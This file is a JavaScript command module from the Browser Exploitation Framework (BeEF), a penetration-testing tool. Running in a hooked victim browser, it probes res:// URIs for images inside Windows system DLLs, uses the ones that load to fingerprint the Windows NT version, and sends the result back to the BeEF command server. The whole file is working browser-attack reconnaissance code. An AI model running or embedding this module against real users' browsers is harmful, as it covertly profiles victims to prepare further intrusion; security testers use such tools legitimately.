//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var os_version = new Array;
	var dom = document.createElement('b');

	Array.prototype.unique = function() {
		var o = {}, i, l = this.length, r = [];
		for(i=0; i<l;i+=1) o[this[i]] = this[i];
		for(i in o) r.push(o[i]);
		return r;
	};

	parse_os_details = function() {
		if (!os_version.length) os_version[0] = "unknown";
		beef.net.send("<%= @command_url %>", <%= @command_id %>, "windows_nt_version="+os_version.unique());
	};

	// OS fingerprints // in the form of: "URI","NT version(s)"
	var fingerprints = new Array(
		new Array("5.1+","res://IpsmSnap.dll/wlcm.bmp"),
		new Array("5.1+","res://wmploc.dll/257/album_0.png"),
		new Array("5.1-6.0","res://wmploc.dll/23/images\amg-logo.gif"),
		new Array("5.1-6.1","res://wmploc.dll/wmcomlogo.jpg"),
		new Array("6.0+","res://wdc.dll/error.gif")
	);

	for (var i=0; i<fingerprints.length; i++) {
		var img    = new Image;
		img.name   = fingerprints[i][0];
		img.src    = fingerprints[i][1];
		img.onload = function() { os_version.push(this.name); dom.removeChild(this); }
		dom.appendChild(img);
	}

	setTimeout('parse_os_details();', 2000);

});

